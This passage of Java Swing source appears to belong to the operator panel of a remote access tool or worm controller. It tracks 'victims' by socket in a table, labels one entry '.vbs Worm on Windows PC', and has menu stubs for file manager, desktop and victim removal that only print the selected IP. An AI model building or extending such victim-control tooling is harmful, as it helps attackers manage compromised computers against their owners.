				 
				
				//Program Owner : SaherBlueEagle

					new Thread() {
						public void run() {
							  
							try {
								Notif instance_fm;
								instance_fm = new Notif(str2,str1,str3,str4,str5,str6);
								 if (Open_Notif.contains(instance_fm)==false){
									  Open_Notif.add(instance_fm);
								  }
								
								
								  Open_Forms.add("notif" + str2);
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					}.start();
				  
				  
			}
		}
	
	public static void get_row_index(String sock){
		 DefaultTableModel Model = (DefaultTableModel) j.getModel();
		 for(int row = 0;row < Model.getRowCount();row++) {
			
			 	    for(int col = 0;col < Model.getColumnCount();col++) {
			 	    	if (Model.getValueAt(row, 2) == sock || (Model.getValueAt(row, 2)).toString().contains(sock)){
			 	    		Model.removeRow(row);
			 	    		break;
			 	    	}
			 	        
			 
			 	    }
			 
			 	}
	}
	public static void Add_Victim(String Data , String sock){
		 
		//Program Owner : SaherBlueEagle

		 yourAddRow("...","value1",sock,"value3","value4","value5",".vbs Worm on Windows PC","value7");
		 j.repaint();
		 //sp = new JScrollPane(j); 
	     //sp.setBounds(5, 50, 990, 300); 
	     sp.updateUI();
		 form.repaint();
		 
	}
	public static void Del_Victim(String Data , String sock){
		get_row_index(sock);
		  screen.setIcon(null);
			
		  screen.repaint();
	}
	@Override
	public void actionPerformed(ActionEvent event) {
		  JMenuItem menu = (JMenuItem) event.getSource();
		  System.out.println("ana hena");
	        if (menu == menuItemFilemanager) {
	        	int selectedRow = j.getSelectedRow();
	        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
	        	System.out.println("File Command IP : " + selected_sock);
	        } else if (menu == menuItemDesktop) {
	        	int selectedRow = j.getSelectedRow();
	        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
	        	System.out.println("Desktop Command IP : " + selected_sock);
	        	
	        } else if (menu == menuItemRemoveVictim) {
	        	int selectedRow = j.getSelectedRow();
	        	String selected_sock = j.getModel().getValueAt(selectedRow, 2).toString();
	        	System.out.println("Remove Victim Command IP : " + selected_sock);
	        	
	        }
		
	}
}

class MessageBoxc
{ 
	//Program Owner : SaherBlueEagle

   public static void infoBox(final String infoMessage, final String titleBar)
   {Thread t = new Thread(new Runnable(){
       public void run(){
           JOptionPane.showMessageDialog(null, infoMessage, titleBar, JOptionPane.WARNING_MESSAGE);
       }
   });
 t.start();

   }
   public static void errorBox_nothread(final String infoMessage, final String titleBar)

   {
           
    



   }
}
class ImageMessageBox
{

	//Program Owner : Saher Blue Eagle
	 

   public static void show_box(final String infoMessage, final String titleBar,String img_path)
 
   {
	 
	   ImageIcon iconic = new ImageIcon(Master.class.getResource(img_path));
            JOptionPane.showMessageDialog(null, infoMessage, titleBar, JOptionPane.QUESTION_MESSAGE,iconic);
    



   }
}